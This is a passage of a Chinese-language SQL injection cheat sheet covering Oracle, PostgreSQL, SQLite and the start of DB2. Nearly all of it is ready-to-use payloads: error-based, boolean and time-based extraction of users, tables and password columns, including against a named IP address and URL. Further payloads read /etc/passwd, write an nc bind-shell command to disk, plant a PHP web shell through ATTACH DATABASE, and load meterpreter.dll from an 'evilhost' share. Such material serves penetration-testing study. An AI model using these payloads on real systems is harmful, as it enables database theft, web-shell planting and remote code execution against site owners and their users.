<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and 1=ctxsys.drithsx.sn(1,(select user from dual))--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=1&#39; and 1=ctxsys.drithsx.sn(1,(select banner from v$version where banner like &#39;Oracle%))--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=1&#39; and 1=ctxsys.drithsx.sn(1,(select table_name from (select rownum as limit,table_name from user_tables) where limit= 3))--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=1&#39; and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name =&#39;USERS&#39;) where limit=3))--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id=1&#39; and 1=ctxsys.drithsx.sn(1,(select passwd from (select passwd,rownum as limit from users) where limit=1))--
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="盲注-3">盲注</h2>
<h3 id="布尔盲注-2">布尔盲注</h3>
<p>既然是盲注，那么肯定涉及到条件判断语句，Oracle除了使用IF the else end if这种复杂的，还可以使用 <code>decode() </code>函数。
语法：<code>decode(条件,值1,返回值1,值2,返回值2,...值n,返回值n,缺省值);</code></p>
<p>该函数的含义如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">IF 条件=值1 THEN　　　　
</span></span><span class="line"><span class="cl">		RETURN(返回值1)
</span></span><span class="line"><span class="cl">ELSIF 条件=值2 THEN　　　　
</span></span><span class="line"><span class="cl">		RETURN(返回值2)　　　　
</span></span><span class="line"><span class="cl">		......
</span></span><span class="line"><span class="cl">ELSIF 条件=值n THEN　　　　
</span></span><span class="line"><span class="cl">	RETURN(返回值n)
</span></span><span class="line"><span class="cl">ELSE　　　　
</span></span><span class="line"><span class="cl">	RETURN(缺省值)
</span></span><span class="line"><span class="cl">END IF
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">?id<span class="o">=</span>1<span class="s1">&#39; and 1=(select decode(user,&#39;</span>SYSTEM<span class="s1">&#39;,1,0,0) from dual)--
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span> and <span class="nv">1</span><span class="o">=(</span><span class="k">select</span> decode<span class="o">(</span>substr<span class="o">(</span>user,1,1<span class="o">)</span>,<span class="s1">&#39;S&#39;</span>,1,0,0<span class="o">)</span> from dual<span class="o">)</span>--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>1<span class="err">&#39;</span> and ascii<span class="o">(</span>substr<span class="o">(</span>user,1,1<span class="o">))</span>&gt; 64--  <span class="c1">#二分法</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="时间盲注-1">时间盲注</h3>
<p>可使用<code>DBMS_PIPE.RECEIVE_MESSAGE('任意值',延迟时间)</code>函数进行时间盲注，这个函数可以指定延迟的时间</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">AND <span class="o">[</span>RANDNUM<span class="o">]=</span>DBMS_PIPE.RECEIVE_MESSAGE<span class="o">(</span><span class="s1">&#39;[RANDSTR]&#39;</span>,<span class="o">[</span>SLEEPTIME<span class="o">])</span>                 comment:   -- /**/
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">?id<span class="o">=</span>1<span class="s1">&#39; and 1=(case when ascii(substr(user,1,1))&gt; 128 then DBMS_PIPE.RECEIVE_MESSAGE(&#39;</span>a<span class="s1">&#39;,5) else 1 end)--
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span> and <span class="nv">1</span><span class="o">=(</span><span class="k">case</span> when ascii<span class="o">(</span>substr<span class="o">(</span>user,1,1<span class="o">))</span>&gt; <span class="m">64</span> <span class="k">then</span> DBMS_PIPE.RECEIVE_MESSAGE<span class="o">(</span><span class="s1">&#39;a&#39;</span>,5<span class="o">)</span> <span class="k">else</span> <span class="m">1</span> end<span class="o">)</span>--
</span></span></code></pre></td></tr></table>
</div>
</div><p>decode不仅可以在布尔盲注中运用，也可以用在延迟盲注中</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and 1=(select decode(substr(user,1,1),&#39;S&#39;,dbms_pipe.receive_message(&#39;RDS&#39;,10),0) from dual) --
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> http://www.jsporcle.com/news.jsp?id=1 and 1=(select decode(substr(user,1,1),&#39;S&#39;,dbms_pipe.receive_message(&#39;RDS&#39;,5),0) from dual) --
</span></span></code></pre></td></tr></table>
</div>
</div><p>当然，这里延迟的操作不一定用延迟函数，也可以使用花费更多时间去查询所有数据库的条目。例如:</p>
<p><code>(select count(*) from all_objects) </code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.jsporcle.com/news.jsp?id=1 and 1=(select decode(substr(user,1,1),&#39;S&#39;,(select count(*) from all_objects),0) from dual) and &#39;1&#39;=&#39;1&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过这种明显时间差也能判断注入表达式的结果。</p>
<h1 id="postgresql注入">PostgreSQL注入</h1>
<h2 id="注入流程-3">注入流程</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#order by  猜字段</span>
</span></span><span class="line"><span class="cl">219.153.49.228:47148/new_list.php?id<span class="o">=</span><span class="m">1</span> order by <span class="m">4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#判断是否为postgresql</span>
</span></span><span class="line"><span class="cl">?id<span class="o">=</span><span class="m">1</span> and 1::int<span class="o">=</span>1--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#全部用null填充 方便在测试类型</span>
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>-1 union <span class="k">select</span> null,null,null,null 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#测试类型，  这里为字符类型</span>
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>-1  union <span class="k">select</span> null,<span class="s1">&#39;null&#39;</span>,<span class="s1">&#39;null&#39;</span>,null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#当前数据库</span>
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>-1 union <span class="k">select</span> null,current_database<span class="o">()</span>,<span class="s1">&#39;null&#39;</span>,null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#表名       </span>
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>-1 union <span class="k">select</span> null,relname,<span class="s1">&#39;null&#39;</span>,null from pg_stat_user_tables limit <span class="m">1</span> offset <span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#列名   分析解说：通过SQL语句中联合查询，修改offset后面的数字得到2个字段，和字段名</span>
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>-1 union <span class="k">select</span> null,column_name,<span class="s1">&#39;null&#39;</span>,null from+information_schema.columns where <span class="nv">table_name</span><span class="o">=</span><span class="s1">&#39;reg_users&#39;</span> limit <span class="m">1</span> offset <span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#字段值     offset不断改变值，依次获取值   通过SQL语句联合查询，显示出key的MD5值。</span>
</span></span><span class="line"><span class="cl">?id<span class="o">=</span>-1 union <span class="k">select</span> null,<span class="s1">&#39;null&#39;</span>,<span class="s1">&#39;用户名:&#39;</span><span class="o">||</span>name<span class="o">||</span><span class="s1">&#39;,密码:&#39;</span><span class="o">||</span>password<span class="o">||</span><span class="s1">&#39;,状态:&#39;</span><span class="o">||</span>status<span class="o">||</span><span class="s1">&#39;,id:&#39;</span><span class="o">||</span>id,null from reg_users limit <span class="m">1</span> offset <span class="m">0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="常用查询-1">常用查询</h2>
<p>注释</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">--
</span></span><span class="line"><span class="cl">/**/  
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看数据库版本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT version()
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看当前用户</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT user;
</span></span><span class="line"><span class="cl">SELECT current_user;
</span></span><span class="line"><span class="cl">SELECT session_user;
</span></span><span class="line"><span class="cl">SELECT usename FROM pg_user;
</span></span><span class="line"><span class="cl">SELECT getpgusername();
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看当前用户是否超级用户</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SHOW is_superuser; 
</span></span><span class="line"><span class="cl">SELECT current_setting(&#39;is_superuser&#39;);
</span></span><span class="line"><span class="cl">SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER
</span></span></code></pre></td></tr></table>
</div>
</div><p>列数据库</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT datname FROM pg_database
</span></span></code></pre></td></tr></table>
</div>
</div><p>列出表</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT table_name FROM information_schema.tables
</span></span></code></pre></td></tr></table>
</div>
</div><p>列出列名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT column_name FROM information_schema.columns WHERE table_name=&#39;data_table&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="报错注入-3">报错注入</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name=&#39;data_table&#39;+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&#39; and 1=cast((SELECT concat(&#39;DATABASE: 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&#39;,current_database())) as int) and &#39;1&#39;=&#39;1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&#39; and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and &#39;1&#39;=&#39;1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&#39; and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name=&#39;data_table&#39; LIMIT 1 OFFSET data_offset) as int) and &#39;1&#39;=&#39;1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&#39; and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and &#39;1&#39;=&#39;1
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="盲注-4">盲注</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; and substr(version(),1,10) = &#39;PostgreSQL&#39; and &#39;1  -&gt; OK
</span></span><span class="line"><span class="cl">&#39; and substr(version(),1,10) = &#39;PostgreXXX&#39; and &#39;1  -&gt; KO
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="时间盲注-2">时间盲注</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
</span></span><span class="line"><span class="cl">AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="文件操作-2">文件操作</h2>
<p><strong>读取文件</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select pg_ls_dir(&#39;./&#39;);
</span></span><span class="line"><span class="cl">select pg_read_file(&#39;PG_VERSION&#39;, 0, 200);
</span></span></code></pre></td></tr></table>
</div>
</div><p>早期版本的<code>pg_read_file</code>和<code>pg_ls_dir</code>不支持绝对路径，但是新版本将允许超级用户或者在<code>default_role_read_server_files</code>组中的用户使用:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CREATE TABLE temp(t TEXT);
</span></span><span class="line"><span class="cl">COPY temp FROM &#39;/etc/passwd&#39;;
</span></span><span class="line"><span class="cl">SELECT * FROM temp limit 1 offset 0;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT lo_import(&#39;/etc/passwd&#39;); -- will create a large object from the file and return the OID
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SELECT lo_get(16420); -- use the OID returned from the above
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SELECT * from pg_largeobject; -- or just get all the large objects and their data
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>写文件</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CREATE TABLE pentestlab (t TEXT);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">INSERT INTO pentestlab(t) VALUES(&#39;nc -lvvp 2346 -e /bin/bash&#39;);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SELECT * FROM pentestlab;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">COPY pentestlab(t) TO &#39;/tmp/pentestlab&#39;;
</span></span></code></pre></td></tr></table>
</div>
</div><p>一行：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">COPY <span class="o">(</span>SELECT <span class="s1">&#39;nc -lvvp 2346 -e /bin/bash&#39;</span><span class="o">)</span> TO <span class="s1">&#39;/tmp/pentestlab&#39;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bypass-filter">Bypass Filter</h2>
<p>Using <code>CHR</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT CHR(65)||CHR(66)||CHR(67);
</span></span></code></pre></td></tr></table>
</div>
</div><p>Using <code>Dollar-signs</code> ( &gt;= version 8 PostgreSQL)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT $$This is a string$$
</span></span><span class="line"><span class="cl">SELECT $TAG$This is another string$TAG$
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="sqlite注入">SQLite注入</h1>
<h2 id="sqlite-comments">SQLite comments</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">--
</span></span><span class="line"><span class="cl">/**/
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="sqlite-version">SQLite version</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select sqlite_version();
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="string-based---extract-database-structure">String based - Extract database structure</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT sql FROM sqlite_schema
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="integerstring-based---extract-table-name">Integer/String based - Extract table name</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT tbl_name FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Use limit X+1 offset X, to extract all tables.</p>
<h2 id="integerstring-based---extract-column-name">Integer/String based - Extract column name</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT sql FROM sqlite_master WHERE type!=&#39;meta&#39; AND sql NOT NULL AND name =&#39;table_name&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>For a clean output</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,&#39;(&#39;)%2b1)),instr((substr(sql,instr(sql,&#39;(&#39;)%2b1)),&#39;&#39;)),&#34;TEXT&#34;,&#39;&#39;),&#34;INTEGER&#34;,&#39;&#39;),&#34;AUTOINCREMENT&#34;,&#39;&#39;),&#34;PRIMARY KEY&#34;,&#39;&#39;),&#34;UNIQUE&#34;,&#39;&#39;),&#34;NUMERIC&#34;,&#39;&#39;),&#34;REAL&#34;,&#39;&#39;),&#34;BLOB&#34;,&#39;&#39;),&#34;NOT NULL&#34;,&#39;&#39;),&#34;,&#34;,&#39;~~&#39;) FROM sqlite_master WHERE type!=&#39;meta&#39; AND sql NOT NULL AND name NOT LIKE &#39;sqlite_%&#39; AND name =&#39;table_name&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="boolean---count-number-of-tables">Boolean - Count number of tables</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and (SELECT count(tbl_name) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; ) &lt; number_of_table
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="boolean---enumerating-table-name">Boolean - Enumerating table name</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and (SELECT length(tbl_name) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name not like &#39;sqlite_%&#39; limit 1 offset 0)=table_name_length_number
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="boolean---extract-info">Boolean - Extract info</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 1 offset 0) &gt; hex(&#39;some_char&#39;)
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="time-based">Time based</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AND [RANDNUM]=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="remote-command-execution-using-sqlite-command---attach-database">Remote Command Execution using SQLite command - Attach Database</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ATTACH DATABASE &#39;/var/www/lol.php&#39; AS lol;
</span></span><span class="line"><span class="cl">CREATE TABLE lol.pwn (dataz text);
</span></span><span class="line"><span class="cl">INSERT INTO lol.pwn (dataz) VALUES (&#39;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#39;);--
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="remote-command-execution-using-sqlite-command---load_extension">Remote Command Execution using SQLite command - Load_extension</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">UNION SELECT 1,load_extension(&#39;\\evilhost\evilshare\meterpreter.dll&#39;,&#39;DllMain&#39;);--
</span></span></code></pre></td></tr></table>
</div>
</div><p>Note: By default this component is disabled</p>
<h2 id="db2注入">DB2注入</h2>
<h3 id="version">Version</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select versionnumber, version_timestamp from sysibm.sysversions;
</span></span><span class="line"><span class="cl">select service_level from table(sysproc.env_get_inst_info()) as instanceinfo
</span></span><span class="line"><span class="cl">select getvariable(&#39;sysibm.version&#39;) from sysibm.sysdummy1 -- (v8+)
</span></span><span class="line"><span class="cl">select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo
</span></span><span class="line"><span class="cl">select service_level,bld_level from sysibmadm.env_inst_info
